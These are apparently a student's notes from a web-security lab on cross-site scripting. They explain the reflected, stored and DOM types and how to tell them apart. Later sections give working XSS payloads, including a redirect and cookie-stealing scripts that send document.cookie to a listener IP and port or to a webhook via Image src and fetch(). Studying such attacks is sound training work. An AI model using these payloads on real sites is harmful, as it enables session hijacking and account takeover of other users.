
Lets us execute Javascript in victims browser and often gives us control over the application for that user

Three main types of XSS

1) Reflected XSS : Script we are trying to inject comes from current HTTP request. We send a request, we get a response and that script is included in the response. So vulnerable script
   included in same request response

2) Stored XSS : Payload stored in database and retrieved later. Has much higher impact

3) DOM XSS : Client side has vulnerable Javascript that trusts vulnerable input instead of having the vulnerability server side

***Keep an eye on the network tab, if no request sent then client side injection, DOM XSS.
If request sent to the server, check if its stored in database or sent back in same request-response, depending on that it might be Stored XSS or Reflected XSS***

---

### Basic XSS Attack

User input being reflected on web page, so maybe Reflected XSS?

Give input and check network tab, nothings fills up network tab, so all things happening client side

 It is all happening on client side. In reflected XSS we get a response from server after entering an input which can be seen in the network tab

```js
<script>prompt(1)</script>
```


this becomes part of the page but we need something to trigger it

```js
<img src onerror="prompt(1)"/>
```


OR


```js
<iframe src onload="alert`1`"/>
```

to forward the user to different location

```js
<img src onerror="window.location.href='targetAddress'">
```

Example :

```js
<img src=x onerror="window.location.href='https://google.com'"> 
```


targetURL also inside quotes

---


### Stored XSS

Server Side Injection so some traffic can be seen in network tab(same for reflected XSS)

Spawn 2 containers

set cookie in one of the containers

to check if cookie is set 1)console.log(document.cookie) 2)Dev tool -> Storage ->Cookie

_**to check for XSS first try HTML injection coz that is likely to work**_

in the input field

```html
<h1>test</h1>
```

HTML injection works, now try for XSS

```js
<script>prompt(1)</script>
```

go in other container and we get prompt so it is stored

to get the cookie of other users

```js
<script>alert(document.cookie)</script>
```


***If http only flag set, JS cannot access the cookies***


---

### Lab Challenge

stored xss

escape \<p> tag first

```js
</p> <script>new Image().src="http://192.168.57.5:4444/?"+ encodeURI(document.cookie);</script>
```

OR

```js
</p><script>var i=new Image; i.src="webHookAddress/?"+document.cookie;</script>
```

We want the cookie to be appended to the URL but as a paramter so, add /?
If we dont do this, cookie will be attached to URL which will change the URL
and we wont we able to capture the request with netcat or webhook

new Image() constructor create an image object it is similar to

document.createElement("image")

The encodeURIComponent() function encodes a URI by replacing each instance of certain characters by one, two, three, or four escape sequences representing the UTF-8

Cookie exfiltration
```js
<script>
fetch('https://webhook', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```
---
